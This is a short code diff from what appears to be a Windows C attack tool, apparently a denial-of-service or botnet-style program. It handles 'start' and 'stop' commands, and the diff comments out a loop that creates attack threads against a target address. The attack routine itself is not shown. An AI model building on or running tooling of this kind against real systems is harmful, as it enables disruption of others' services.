@@ -58,13 +58,13 @@ int main() {
         else if (strcmp(cmd_arg1, "start") == 0){
             printf("Executing attack...\n");
             running = 1;
-            for (int i=0; i<NUM_THREADS; i++){
-                attack_threads[i] = CreateThread(NULL, 0, attack, (LPVOID)&target_addr, 0, NULL);
-                // printf("Thread created");
-                if (attack_threads[i] == NULL){
-                    printf("error creating thread \n");
-                }
-            }
+            // for (int i=0; i<NUM_THREADS; i++){
+            //     attack_threads[i] = CreateThread(NULL, 0, attack, (LPVOID)&target_addr, 0, NULL);
+            //     // printf("Thread created");
+            //     if (attack_threads[i] == NULL){
+            //         printf("error creating thread \n");
+            //     }
+            // }
         } else if (strcmp(cmd_arg1, "stop") == 0){
             running = 0;
             printf("Stopping attack...\n");
